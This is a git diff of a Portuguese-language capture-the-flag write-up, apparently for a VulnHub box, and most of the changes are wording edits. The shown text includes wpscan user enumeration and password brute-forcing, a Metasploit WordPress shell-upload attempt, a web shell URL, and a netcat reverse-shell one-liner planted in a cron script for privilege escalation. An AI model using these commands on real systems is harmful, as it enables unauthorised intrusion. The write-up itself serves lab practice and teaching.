@@ -8,7 +8,7 @@ Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.56.100  08:00:27:7c:9f:5d       PCS Systemtechnik GmbH                                                                                                
 192.168.56.107  08:00:27:5a:c8:ef       PCS Systemtechnik GmbH
 ```
-Está rodando no endereço de final *107*.
+Está rodando no endereço de final **107**.
 
 2) Rodo o nmap para verificar as portas e serviços:
 ```
@@ -174,7 +174,7 @@ Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you mea
 ```
 wpscan --url https://192.168.56.107:12380/blogblog/ -e --api-token <token> --disable-tls-checks
 ```
-Eu sempre executo com o --api-token (serviço de busca automática de vulnerabilidades do wpvulndb) e por ser uma box antiga, ele trouxe 1001 'problemas' com o CMS. O que me interessa é algo mais incisivo (alguma RCE ou SQL Injection) o que infelizmente não tem. Massss, ele encontra uma lista de usuários, vou tentar uma força-bruta tentando um login na aplicação:
+Eu sempre executo com o --api-token (serviço de busca automática de vulnerabilidades do wpvulndb) e por ser uma box antiga, ele trouxe 1001 'problemas' com o CMS. O que me interessa é algo mais incisivo (algum RCE ou SQL Injection) o que infelizmente não tem (ou não vi). Massss, ele encontra uma lista de usuários, vou tentar uma força-bruta tentando um login na aplicação:
 
 ```
 wpscan --url https://192.168.56.107:12380/blogblog/ -e -U wordpress_users -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt --disable-tls-checks
@@ -190,9 +190,9 @@ Depois de um tempo (com algumas wordlists diferentes):
 | Username: john, Password: incorrect
 ```
 
-Logo um por um e temos um administrador, o senhor `john`.
+Faço o login de um por um e temos um administrador, o senhor `john`.
 
-8) Em CTF's já peguei alguns Wordpress, e quando já tenho a autenticação gosto de usar o exploit `unix/webapp/wp_admin_shell_upload` via metasploit (ele automatiza todo o processo, loga, submete um plugin malicioso e retorna um shell) porém não deu certo :(, vou atrás de entender o que está acontecendo e essa instalação pede algumas credenciais para fazer a instalação do plugin (isso via FTP). Bom, mas não tem tudo está perdido, sei que o Wordpress mantém no wp-contents esses conteúdos que se faz upload, vou até 'Media -> Library' e para a minha surpresa está tudo lá.
+8) Em CTF's já peguei alguns Wordpress, e quando já tenho a autenticação gosto de usar o exploit `unix/webapp/wp_admin_shell_upload` via metasploit (ele automatiza todo o processo, loga, submete um plugin malicioso e retorna um shell) porém não deu certo :(, vou atrás de entender o que está acontecendo e essa instalação pede algumas credenciais para fazer a instalação do plugin (via FTP). Bom, mas não tem tudo está perdido, sei que o Wordpress mantém no wp-contents esses conteúdos que se faz upload, vou até 'Media -> Library' e para a minha surpresa está tudo lá.
 
 ```
 https://192.168.56.107:12380/blogblog/wp-content/uploads/wordpress-plugin-shell.php
@@ -241,7 +241,7 @@ drwxr-xr-x 2 zoe        zoe        4096 Jun  5  2016 zoe
 ```
 Interessante, é isso que eu vou aproveitar para escalar os meus privilégios.
 
-10) Adiciono a carga no cron-logrotate.sh, subo um listener via netcat e aguardo alguns minutos:
+10) Adiciono a carga abaixo no cron-logrotate.sh, subo um listener via netcat e aguardo alguns minutos:
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.105 1234 >/tmp/f
 ```
